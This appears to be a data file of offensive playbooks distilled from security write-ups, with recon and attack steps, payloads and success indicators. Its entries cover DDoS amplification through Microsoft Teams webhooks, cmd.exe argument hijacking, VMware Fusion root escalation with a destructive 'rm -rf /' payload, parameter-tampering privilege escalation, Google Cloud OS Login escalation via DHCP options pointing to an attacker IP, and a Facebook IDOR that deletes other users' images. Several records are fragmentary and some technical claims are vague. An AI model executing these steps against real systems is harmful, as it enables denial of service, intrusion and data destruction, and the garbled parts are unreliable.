prerequisites: Ability to configure an Incoming Webhook in Microsoft Teams.
Knowledge of the target URL to flood with requests.
applicability_signals: Microsoft Teams Incoming Webhook supports HTML.
The Incoming Webhook makes GET requests to load external images specified in `` tags.
skip_if: Microsoft Teams restricts HTML in Incoming Webhooks.
The target service has robust rate limiting or DDoS protection that can withstand the generated traffic.

recon_steps: Step 1: Configure a Microsoft Teams Incoming Webhook in a channel and obtain the webhook URL.
Step 2: Identify a target URL that can be subjected to a high volume of GET requests.
attack_steps: Step 1: Craft an HTML message containing multiple `` tags, each with a `src` attribute pointing to the target URL with a unique query parameter (e.g., ``).
Step 2: Use a script (e.g., Python) to send this crafted message to the Microsoft Teams Incoming Webhook multiple times (e.g., 20 times).
Step 3: Observe the target server logs or use a service like webhook.site to confirm the high volume of GET requests originating from Microsoft Teams IP addresses.
Step 4: Repeat sending the requests to various channels and loading them simultaneously to amplify the DDoS effect.
tools_recommended: Python for scripting the webhook requests.
webhook.site for observing incoming requests.
Apache2 or similar web server for testing and log analysis.
success_indicators: A significant increase in GET requests to the target URL originating from Microsoft Teams IP addresses (e.g., 52.114.128.37).
Target server experiencing high load or becoming unresponsive.
Web server logs showing a flood of requests within a short timeframe.
failure_indicators: No GET requests observed at the target URL or webhook.site.
Microsoft Teams displaying an error when trying to send the webhook.
Target server responding with 429 Too Many Requests or similar rate limiting errors for individual requests.

playbooks.impact: Denial of Service (DoS) against a target URL by overwhelming it with a high volume of GET requests initiated through Microsoft Teams' Incoming Webhook feature, exploiting the lack of rate limiting for external image loading.
playbooks.key_lesson: Always inspect the outgoing requests made by integrated services (like Microsoft Teams webhooks) for potential rate limiting bypasses, especially when they handle external content like images.

meta.title: Cmd Hijack - a command/argument confusion with path traversal in cmd.exe

affected_components: External command execution via cmd.exe /c with user-controlled arguments

trigger_conditions.when_to_apply: When an application executes external commands using cmd.exe with the /c switch and directly incorporates user-controlled input as an argument to the command, without proper quoting.
prerequisites: The target application must execute commands via cmd.exe using the /c switch.
User-controlled input must be passed as an argument to the executed command.
The user-controlled argument must not be enclosed in single or double quotes.
applicability_signals: Application uses functions like PHP's `shell_exec()` or `system()` with user input.
Application uses `escapeshellcmd()` instead of `escapeshellarg()` for argument sanitization.
Observable command lines in logs show user input being directly appended to commands like `ping`.
skip_if: User-controlled arguments are consistently enclosed in single or double quotes by the application.
The application uses `escapeshellarg()` correctly for all user-controlled input.
The executed commands do not involve cmd.exe or lack the /c switch for argument processing.

recon_steps: Step 1: Identify applications that execute external commands on the system, particularly those using cmd.exe.
Step 2: Analyze the command execution flow to determine if user-controlled input is used as part of the command arguments.

Step 3: Check for the presence of functions like `shell_exec()`, `system()`, or `exec()` in the application's source code, and verify the sanitization methods used (e.g., `escapeshellcmd()` vs. `escapeshellarg()`).
attack_steps: Step 1: Identify a command that can be executed by the target application (e.g., `ping`, `ipconfig`).
Step 2: Craft a payload that includes path traversal sequences to reach a desired executable (e.g., `../../../../../../../../../../windows/system32/calc.exe`).
Step 3: Inject this crafted payload as the user-controlled argument to the identified command execution function.
Step 4: Observe the system for the execution of the unintended executable (e.g., `calc.exe` instead of `ping.exe`).
tools_recommended: Burp Suite: Intercept and modify requests to test user-controlled input fields.
Sysmon: Monitor process creation events for evidence of command execution.
PHP source code analysis tools: To identify vulnerable functions and sanitization methods.
success_indicators: Execution of an unexpected executable (e.g., `calc.exe` launched when `ping.exe` was expected).
Process creation logs (e.g., Sysmon) showing the hijacked command line.
Observable impact based on the injected payload (e.g., calculator opening for `calc.exe` payload).
failure_indicators: The original command executes as expected (e.g., `ping 127.0.0.1` completes without error, but `calc.exe` does not launch).
The argument is treated as a literal string and the command fails due to an invalid argument.
A 403 Forbidden or similar error if a WAF is present and detects suspicious path traversal characters or executable names.

playbooks.impact: Arbitrary Code Execution (ACE) by tricking cmd.exe into executing a different executable than intended, leading to potential data access, system compromise, or denial of service, depending on the injected payload and permissions.
playbooks.key_lesson: When executing external commands with user-supplied arguments, always enclose the user-supplied argument in quotes (e.g., using `escapeshellarg()` in PHP) to prevent argument injection and path traversal vulnerabilities.

meta.title: Local Privilege Escalation Discovered in VMware Fusion

trigger_conditions.when_to_apply: When the target is a privileged binary that implicitly trusts parts of its execution path or file access, and kernel restrictions on hard links are absent.
prerequisites: Attacker has local access to the target machine.
VMware Fusion is installed.
applicability_signals: The existence of a privileged binary (e.g., setuid binary).
The application performs file operations (read, write, execute) that can be influenced by path traversal or manipulated file links.
The OS (macOS in this case) does not have strong kernel-level restrictions on hard/symbolic links compared to Linux.
The application performs a signature check before execution but can be bypassed.
skip_if: The target binary does not have elevated privileges.
The operating system has robust kernel-level protections against manipulated file links that prevent privilege escalation.
The application performs strict integrity checks on all file accesses that cannot be bypassed by manipulating paths or links.

recon_steps: Identify privileged binaries on the target system (e.g., using `find / -perm -4000 -type f`).

Analyze the behavior of identified privileged binaries using dynamic analysis tools like `dtruss` (macOS) or FireEye's Monitor utility to understand their file interactions, especially reads, writes, and executions.
Determine if the privileged binary performs signature checks on executables before running.
Investigate if the application implicitly trusts parts of the path or file access operations.
attack_steps: Create a hard link to the privileged binary (e.g., `/Applications/VMware Fusion.app/Contents/Library/VMware Fusion Services`) to preserve its setuid/setgid bits.
Execute the hard-linked binary. Observe if a code signing error occurs.
If a code signing error occurs, attempt to bypass it by creating another hard link to the same binary, aiming to trick the initial signature check into passing.
Once the signature check is bypassed, analyze the application's behavior again using dynamic analysis tools to identify new opportunities for code injection.
Copy the entire application (e.g., `/Applications/VMware Fusion.app`) to a location under attacker control.
Modify files within the copied application that the privileged binary might execute or interact with.
Execute the modified privileged binary from the attacker-controlled location.
payloads_or_patterns:
# Example of creating a hard link to a binary
ln /Applications/VMware Fusion.app/Contents/Library/VMware Fusion Services ./attacker_controlled_binary

# Example of executing a hard link (might require specific paths for initial test)
./attacker_controlled_binary

# Example of copying and modifying the application (conceptual)
cp -R /Applications/VMware Fusion.app /tmp/attacker_vmware
# Modify a script or binary within /tmp/attacker_vmware that the main binary executes

# Example of creating a malicious script to be executed
cat << EOF > /tmp/attacker_vmware/Contents/Library/services.sh
#!/bin/bash
# Malicious payload
rm -rf / --no-preserve-root
EOF
chmod +x /tmp/attacker_vmware/Contents/Library/services.sh
tools_recommended: find: to locate privileged binaries (`find / -perm -4000 -type f`)
ln: to create hard links
dtruss (macOS): for dynamic tracing of system calls
FireEye Monitor utility (macOS): for analyzing application behavior
cp: to copy application directories
success_indicators: Execution of attacker-controlled code with root privileges (e.g., creating a file as root, executing a shell command that requires root).
Observing the attacker's payload executed by the privileged process.
The `root` user executing a file named `services.sh` from the attacker's controlled directory (as seen in the writeup's Monitor utility example).
failure_indicators: Persistent code signing errors preventing execution.
Application crashes or behaves unexpectedly without executing attacker code.
No evidence of attacker code being executed with elevated privileges.
If the signature check is too robust and cannot be bypassed, pivot to other vulnerabilities or techniques.

playbooks.impact: Arbitrary code execution as root on the target machine, leading to full system compromise.
playbooks.key_lesson: When analyzing privileged binaries, investigate their file access patterns, especially their trust in execution paths and the potential for bypassing signature checks using OS-level features like hard links.

meta.title: From 3,99 to 1,650 USD (Part I) – Simple Vertical Privilege Escalation by Changing HTTP Response

affected_components: User account registration and login flow
tech_stack_fingerprints: Requires phone number with a specific country code for registration

trigger_conditions.when_to_apply: When a web application allows creating accounts with different roles, and user role or privilege status is controlled by parameters within the HTTP request during login or session management.
prerequisites: Ability to register at least two accounts with different initial privilege levels (e.g., staff and administrator)
Access to virtual phone number generation service to bypass country code restrictions if necessary
Ability to intercept and modify HTTP requests
applicability_signals: Parameters like 'isAdm', 'isAdmin', 'isAdministrator', or similar are present in login or session-related requests.
The application allows creation of distinct user roles (e.g., 'staff' vs 'administrator').
The application has a mechanism for editing settings/configurations, possibly controlled by a parameter like 'Edit'.
skip_if: User roles are solely managed server-side with no client-controllable parameters affecting privilege.
WAF blocks modification of common privilege escalation parameters.

recon_steps: Step 1: Register two accounts with different roles (e.g., 'administrator' and 'staff') using distinct phone numbers.
Step 2: Log in with the 'staff' account and intercept the login request using a proxy (e.g., Burp Suite).
Step 3: Analyze the intercepted request for parameters related to user roles or administrative privileges (e.g., 'isAdm', 'isAdmin', 'isAdministrator').
Step 4: Identify any parameters that control editing capabilities (e.g., 'Edit').
attack_steps: Step 1: Log in with the 'staff' account.
Step 2: Intercept the login request.
Step 3: Modify the value of the privilege parameter (e.g., 'isAdm') from 'false' to 'true'.
Step 4: Modify the value of the editing parameter (e.g., 'Edit') from its original value to '1'.
Step 5: Forward the modified request.
Step 6: Log in with the 'administrator' account to verify if the 'staff' account now has administrative privileges or if the editing parameters are changed.
tools_recommended: Burp Suite: For intercepting and modifying HTTP requests.
Virtual phone number service: To create multiple accounts if the target restricts registration by phone number.
success_indicators: The 'staff' account successfully gains administrator privileges, indicated by access to administrative functions or a change in user role displayed in the application.
The ability to edit application settings/configurations becomes available after the modification.
failure_indicators: The login request is rejected or the privilege is not escalated, indicating server-side validation. Pivot: Look for other parameters that might control user permissions or explore different parameter names.
A 403 Forbidden error is returned, suggesting a WAF or access control check. Pivot: Try obfuscating parameter names or values.

playbooks.impact: An attacker can escalate their privileges from a regular user (staff) to an administrator, gaining unauthorized access to sensitive settings, configurations, and potentially other users' data. This can lead to further exploitation, data breaches, or system compromise.
playbooks.key_lesson: Always test for privilege escalation by modifying user role or permission parameters in HTTP requests during login or session management, especially when different user roles exist.

meta.title: Three Privilege Escalation Bugs in Google Cloud Platform’s OS Login

affected_components: Compute Engine instances configured with OS Login
tech_stack_fingerprints: Google Cloud Platform metadata service (instance metadata API)

trigger_conditions.when_to_apply: This exploit is applicable when an attacker has achieved initial access to a Google Cloud Compute Engine instance with an IAM role that *does not* grant administrative privileges (e.g., `roles/compute.osLogin`). The goal is to escalate privileges to root.
prerequisites: Attacker has SSH access to a GCP Compute Engine instance using the `roles/compute.osLogin` IAM role.
The instance is configured to use OS Login.
The instance has LXD or Docker installed and running.
The instance has access to the GCP metadata server.
applicability_signals: Ability to SSH into the instance with a non-administrative user.
Presence of `lxd` or `docker` commands available for the user.
The instance's network allows access to the metadata server at `169.254.169.254`.
skip_if: The attacker already has administrative (root) privileges on the instance.
OS Login is not enabled on the instance.
The instance is not running on Google Cloud Platform.
The metadata server is blocked or inaccessible from the instance.

recon_steps: Step 1: SSH into the target GCP Compute Engine instance using the non-administrative OS Login credentials.
Step 2: Verify user privileges using the `id` command. Confirm that the user is not part of the `root` or `sudo` group.
Step 3: Check for the presence and executability of `lxd` and `docker` commands using `which lxd` and `which docker`.
attack_steps: Step 1 (LXD/Docker Privilege Escalation): If `lxd` is available, attempt to create a privileged LXD container that mounts the host's root filesystem. Execute commands within the container as root. If `docker` is available, attempt to run a privileged Docker container that mounts the host's root filesystem and execute commands within it as root. The writeup implies using the `lxd` or `docker` groups for privilege escalation, which typically involves adding the user to these groups or manipulating their configurations to gain elevated access.

Step 2 (Metadata Server Hijacking): If the above methods fail or are not applicable, focus on the metadata server. Identify sensitive instance metadata that can be controlled or influenced. The DHCP process within GCP instances is a key vector. The writeup mentions that the DHCP server within GCP instances can be manipulated by network packets to serve malicious DHCP options.

Step 3 (Metadata Server Hijacking - Exploit): Craft malicious DHCP options (e.g., custom DNS servers, NTP servers, or PXE boot servers) that point to an attacker-controlled server. Configure the instance to request a new DHCP lease. When the instance receives the malicious DHCP options, it will attempt to connect to the attacker-controlled server, potentially leaking instance credentials or allowing further exploitation. The writeup describes a scenario where modifying the instance's network configuration (e.g., `/etc/dhcpcd.conf`) allows an attacker to prepend malicious options to the DHCP request.

Step 4 (Execute root commands): After establishing a privileged shell or finding a method to influence system configuration (e.g., via LXD/Docker group abuse or metadata server manipulation leading to credential exfiltration and re-authentication as admin), execute commands with root privileges, such as `sudo su` or directly interacting with root-owned files/processes.
payloads_or_patterns: LXD/Docker Abuse: Specific commands will vary based on the exact configuration and version, but generally involve creating privileged containers or manipulating group memberships. Refer to standard LXD/Docker privilege escalation techniques.

Metadata Server Hijacking (DHCP Option Manipulation): Example of a crafted DHCP option to set a custom DNS server: `option domain-name-servers <ATTACKER_IP>;` (This is a conceptual example; the exact format and options used in the writeup are more complex and specific to GCP's DHCP implementation). The writeup indicates modifying `/etc/dhcpcd.conf` to prepend malicious options.
Example of modifying `/etc/dhcpcd.conf` to prepend an attacker-controlled DNS server: `prepend domain-name-servers 10.10.10.10;` where `10.10.10.10` is an attacker-controlled IP.
tools_recommended: SSH client (e.g., OpenSSH, PuTTY)
Burp Suite or similar proxy for intercepting and modifying network traffic (especially for metadata server hijacking if direct packet manipulation is used)
Metasploit (for potential post-exploitation modules)
Custom scripts for DHCP option generation and listener setup
success_indicators: Execution of commands as the `root` user (e.g., `whoami` returning `root`).
Ability to modify sensitive system files or configurations that are normally root-only.
Successful exfiltration of instance metadata or credentials via the metadata server hijacking technique.
Confirmation of privilege escalation through `sudo` execution without a password prompt.
Successful compromise of administrative IAM roles through metadata manipulation if such mechanisms are in place.
failure_indicators: Commands fail with permission denied errors for root-level operations.
LXD/Docker commands report errors or are unavailable.
Metadata server responses are standard and do not indicate manipulation or credential exfiltration.
WAF blocks the attempts or the instance network is secured against such manipulations.
DHCP client ignores or sanitizes malicious DHCP options.

playbooks.impact: Attacker can escalate privileges from a non-administrative user to root on a Google Cloud Compute Engine instance. This allows full control over the compromised instance, including access to all data, ability to install malicious software, pivot to other systems within the GCP network, or disrupt services.
playbooks.key_lesson: Investigate network services like DHCP and metadata servers on cloud instances, as they can expose sensitive information or offer unexpected attack vectors for privilege escalation, especially when combined with user-level access.

meta.title: Another image removal vulnerability on Facebook

affected_components: Series Feature (Poster Art or Cover Image sections)

trigger_conditions.when_to_apply: When an authenticated user can create or manage 'Series' in Facebook Creator Studio, particularly when uploading images for 'Poster Art' or 'Cover Image' sections.
prerequisites: Authenticated user account on Facebook
Access to Facebook Creator Studio
applicability_signals: Existence of the 'Series Feature' in Creator Studio
Requests related to series creation/management containing image IDs
skip_if: No 'Series Feature' available
Requests do not contain modifiable image IDs
WAF blocks requests attempting to modify image IDs

recon_steps: Access Facebook Creator Studio and explore the 'Series Feature'.
Observe network requests made during the creation and management of series, specifically when uploading images for poster or cover art.
attack_steps: Step 1: Create a series with a legitimate image.
Step 2: Intercept the request that creates the series and identify the parameter containing the image ID.
Step 3: Modify the captured image ID to an ID of an image owned by another user (attacker must possess a valid image ID, potentially discoverable via other means or by observing victim actions).
Step 4: Send the modified request.
Step 5: After successfully creating a series with the victim's image, proceed to delete the series.
tools_recommended: Burp Suite (or similar proxy) to intercept and modify HTTP requests.
Browser developer tools to observe network traffic.
success_indicators: The series is created with the victim's image.
Deleting the series results in the victim's image also being deleted from Facebook.
failure_indicators: Request returns 403 Forbidden or 401 Unauthorized: Indicates access control or authentication issues. May require further investigation into session management or specific user roles.
Request returns 400 Bad Request with an invalid image ID error: The substituted image ID might be malformed or not recognized by the server. Ensure the image ID format is correct.
Deleting the series does not delete the victim's image: The vulnerability might be in series creation but not deletion, or the linkage is different than assumed. Re-evaluate the attack chain.

playbooks.impact: An attacker can delete any image on Facebook belonging to another user by leveraging the Series Feature, leading to data loss and potential disruption.
playbooks.key_lesson: When interacting with features that allow users to associate external resources (like images) with their content, always test for the ability to substitute resource identifiers belonging to other users to exploit IDOR vulnerabilities.

meta.title: Privilege Escalation in Google Cloud Platform's OS Login

Attacker can manage SSH keys for the project (e.g., via `gcloud` CLI or Cloud Console).

Attacker can see or manipulate SSH key metadata associated with project users.

Attacker lacks any level of permission to manage project SSH keys.

Step 2: Determine if the attacker account has permissions to manage SSH keys for the project or specific users.

Step 2: Configure the SSH key to grant elevated privileges (e.g., by associating it with a user that has administrative access to the VM).
Step 3: Log in to the VM instance using the attacker-controlled SSH key with the elevated privileges.
payloads_or_patterns: SSH Public Key content (e.g., `ssh-rsa AAAA... user@host`)
tools_recommended: gcloud CLI: for managing project-level SSH keys
SSH client: for logging into the VM instance
success_indicators: Successful SSH login to a VM instance with the attacker-controlled key.
Gaining administrative privileges on the VM instance (e.g., root access) after login.
failure_indicators: SSH login fails with authentication errors.

playbooks.impact: An attacker can gain administrative access (root privileges) to Compute Engine VM instances within a Google Cloud Project by exploiting the OS Login SSH key management functionality.
